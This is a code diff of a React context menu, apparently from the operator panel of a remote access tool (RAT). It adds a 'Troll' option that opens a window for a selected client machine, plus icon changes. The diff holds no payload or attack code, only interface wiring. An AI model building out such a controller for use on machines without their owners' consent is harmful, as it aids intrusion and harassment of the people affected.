@@ -33,6 +33,10 @@ import {
   IconPlug,
   IconShareplay,
   IconNetwork,
+  IconChevronRight,
+  IconMoodSing,
+  IconChevronDown,
+  IconLink,
 } from "@tabler/icons-react";
 
 const menuOptions = [
@@ -98,6 +102,12 @@ const menuOptions = [
         modalId: "message_box_modal",
       },
     ],
+  },
+  {
+    label: "Troll",
+    icon: <IconMoodSing size={24} />,
+    type: "troll",
+    optionType: OptionType.WINDOW,
   },
   {
     label: "System",
@@ -218,6 +228,7 @@ export const ContextMenu: React.FC<ContextMenuProps> = ({
   onClose,
   clientFullName,
 }) => {
+  const { openClientWindow } = useContext(RATContext)!;
   const { setSelectedClient } = useContext(RATContext)!;
   const [activeIndex, setActiveIndex] = useState<number | null>(null);
   const [submenuPosition, setSubmenuPosition] = useState({ top: 0, left: 0 });
@@ -292,12 +303,22 @@ export const ContextMenu: React.FC<ContextMenuProps> = ({
               className={`flex-row gap-3 cursor-pointer flex w-full p-2 hover:bg-accentx transition-all ${
                 isLast ? "" : "border-b border-accentx"
               }`}
+              onClick={() => {
+                if (option.optionType === OptionType.WINDOW) {
+                  openClientWindow(addr, option.type, clientFullName);
+                  onClose();
+                }
+              }}
               onMouseEnter={(e) => handleMouseEnter(index, e)}
             >
               {option.icon}
               {option.label}
-              {option.options && (
-                <i className="ri-arrow-right-line ml-auto"></i>
+              {option.options && activeIndex === index ? (
+                <IconChevronRight size={24} className="ml-auto" />
+              ) : option.options ? (
+                <IconChevronDown size={24} className="ml-auto" />
+              ) : (
+                <IconLink size={24} className="ml-auto" />
               )}
             </div>
           );
